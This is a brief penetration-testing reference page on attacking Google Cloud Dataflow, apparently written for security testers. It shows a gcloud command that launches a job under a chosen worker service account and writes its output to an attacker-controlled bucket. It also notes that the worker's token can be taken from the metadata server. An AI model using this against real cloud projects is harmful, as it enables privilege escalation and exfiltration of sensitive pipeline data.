---
title: "Dataflow: the worker service account and pipeline data"
description: "Attacking Dataflow jobs: the worker service account and pipeline access to source and sink data."
keywords:
  - Dataflow
  - worker service account
  - pipeline
  - job
  - Apache Beam
  - data
---

# Dataflow

Dataflow runs managed Apache Beam pipelines on worker VMs that carry a **worker service account**. Launching a job runs pipeline code on those workers as that account, and the pipeline reads from and writes to the sources and sinks it is configured for (GCS, BigQuery, Pub/Sub), so a job you control reaches both the worker's token and the data in flight.

## Launching a pipeline

```bash
gcloud dataflow jobs list --region <region>
# a custom or template job runs as --service-account-email on the workers
gcloud dataflow jobs run <name> --region <region> \
  --gcs-location gs://<template> \
  --service-account-email <worker-sa> \
  --parameters inputFile=gs://<src>,output=gs://<attacker-sink>
```

## Exploitation notes

- `dataflow.jobs.create` with a chosen worker service account is the [actAs](../identity/privilege-escalation/act-as-deployment/dataproc.md)-style deploy path; the worker's metadata server yields the token.
- Pipelines frequently move high-value data (event streams, warehouse exports); redirecting the sink to a bucket you control exfiltrates it.

## Tools

- **gcloud** (`dataflow jobs list/run`).

## References

- [HackTricks Cloud: GCP Dataflow](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Dataflow security and permissions](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
